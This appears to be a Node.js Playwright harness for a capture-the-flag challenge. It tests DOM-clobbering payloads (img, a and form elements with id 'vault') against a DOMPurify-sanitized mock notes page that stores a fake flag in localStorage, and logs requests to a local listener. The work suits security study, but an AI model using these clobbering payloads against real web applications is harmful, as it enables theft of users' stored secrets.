const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');

// Load local dompurify UMD build
const purifySrc = fs.readFileSync(path.join(__dirname,'node_modules','dompurify','dist','purify.min.js'),'utf8');

const APP_HTML = (bodyRaw) => `<!doctype html><html><head></head><body>
<main id="viewer">
  <article class="note"><h1 id="v-title"></h1><div id="note"></div></article>
  <aside class="vault"><h3>Your vault</h3><div id="vault" aria-hidden="true"></div></aside>
</main>
<script>${purifySrc}</script>
<script>
  localStorage.setItem("flag","NNS{FAKE_LOCAL_FLAG_1234}");
  const raw = ${JSON.stringify(bodyRaw)};
  const c = DOMPurify.sanitize(raw, {FORBID_TAGS:["style"], RETURN_DOM_FRAGMENT:true});
  document.getElementById("note").replaceChildren(c);
  const n = localStorage.getItem("flag");
  if(n){ document.getElementById("vault").textContent = n; }
</script>
</body></html>`;

const payloads = {
  'img_clobber': '<img id="vault" src="http://127.0.0.1:9999/hit_start">',
  'a_clobber': '<a id="vault" href="http://127.0.0.1:9999/a">x</a>',
  'form_clobber': '<form id="vault"></form>',
};

(async () => {
  const http = require('http');
  const hits = [];
  const srv = http.createServer((req,res)=>{ hits.push(req.url); res.end('ok'); });
  await new Promise(r=>srv.listen(9999,r));
  const browser = await chromium.launch();
  for (const [name, body] of Object.entries(payloads)) {
    const page = await browser.newPage();
    const before = hits.length;
    await page.setContent(APP_HTML(body), {waitUntil:'load'}).catch(e=>console.log('err',e.message));
    await page.waitForTimeout(600);
    const info = await page.evaluate(()=>{
      const v = document.getElementById('vault');
      return {tag: v && v.tagName, id_html: v && v.outerHTML && v.outerHTML.slice(0,200), note: document.getElementById('note').innerHTML};
    });
    console.log('\n==',name,'==');
    console.log('getElementById(vault) tag:', info.tag);
    console.log('vault outerHTML:', info.id_html);
    console.log('note innerHTML:', info.note);
    console.log('hits:', JSON.stringify(hits.slice(before)));
    await page.close();
  }
  await browser.close(); srv.close();
})();
